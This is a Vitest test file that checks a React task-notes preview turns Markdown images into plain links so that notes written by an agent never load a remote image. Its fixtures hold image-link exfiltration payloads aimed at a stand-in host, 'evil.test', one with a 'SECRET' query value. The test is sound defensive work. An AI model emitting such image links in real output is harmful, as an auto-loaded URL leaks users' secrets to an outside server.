import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { Notes } from '../features/tasks/PaneFields'

// Task notes an agent wrote must never load a remote image.
describe('task notes preview', () => {
  it('renders a Markdown image as a link, never as <img>', () => {
    const html = renderToStaticMarkup(createElement(Notes, {
      value: 'Pay it ![receipt](https://evil.test/x.png?d=SECRET) today',
      onChange: () => undefined,
    }))
    expect(html).not.toContain('<img')
    expect(html).toContain('href="https://evil.test/x.png?d=SECRET"')
    expect(html).toContain('[image: receipt]')
  })
  it('labels an image with no alt text by its host, and survives a bad URL', () => {
    const html = renderToStaticMarkup(createElement(Notes, { value: '![](https://evil.test/p)', onChange: () => undefined }))
    expect(html).not.toContain('<img')
    expect(html).toContain('[image: evil.test]')
  })
})
